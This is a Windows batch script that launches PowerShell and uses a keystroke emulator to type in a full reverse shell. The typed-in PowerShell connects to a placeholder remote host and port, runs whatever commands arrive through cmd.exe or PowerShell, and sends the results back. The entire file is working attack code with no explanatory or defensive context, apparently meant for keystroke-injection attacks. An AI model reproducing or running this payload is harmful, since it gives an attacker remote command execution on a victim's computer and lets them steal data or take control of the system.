@echo off
start powershell.exe
call "%MYFILES%/keyemu.exe" -text "$socket = new-object System.Net.Sockets.TcpClient('REMOTE_HOST', REMOTE_PORT);"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "if($socket -eq $null){exit 1}"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$stream = $socket.GetStream();"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$writer = new-object System.IO.StreamWriter($stream);"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$buffer = new-object System.Byte[] 1024;"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$encoding = new-object System.Text.AsciiEncoding;"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "do"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "{"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$writer.Flush();"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$read = $null;"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$res = """""
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "while($stream.DataAvailable -or $read -eq $null) {"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$read = $stream.Read($buffer, 0, 1024)"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "}"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$out = $encoding.GetString($buffer, 0, $read).Replace(""`r`n"","""").Replace(""`n"","""");"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "if(!$out.equals(""exit"")){"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$args = """";"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "if($out.IndexOf(' ') -gt -1){"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$args = $out.substring($out.IndexOf(' ')+1);"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$out = $out.substring(0,$out.IndexOf(' '));"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "if($args.split(' ').length -gt 1){"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$pinfo = New-Object System.Diagnostics.ProcessStartInfo"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$pinfo.FileName = ""cmd.exe"""
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$pinfo.RedirectStandardError = $true"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$pinfo.RedirectStandardOutput = $true"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$pinfo.UseShellExecute = $false"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$pinfo.Arguments = ""/c $out $args"""
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$p = New-Object System.Diagnostics.Process"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$p.StartInfo = $pinfo"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$p.Start() | Out-Null"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$p.WaitForExit()"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$stdout = $p.StandardOutput.ReadToEnd()"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$stderr = $p.StandardError.ReadToEnd()"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "if ($p.ExitCode -ne 0) {"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$res = $stderr"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "} else {"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$res = $stdout"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "}"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "}"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "else{"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$res = (&""$out"" ""$args"") | out-string;"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "}"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "}"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "else{"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$res = (&""$out"") | out-string;"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "}"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "if($res -ne $null){"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$writer.WriteLine($res)"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "}"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "}"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "}While (!$out.equals(""exit""))"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$writer.close();"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$socket.close();"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -text "$stream.Dispose();"
call "%MYFILES%/keyemu.exe" -key RETURN
call "%MYFILES%/keyemu.exe" -key RETURN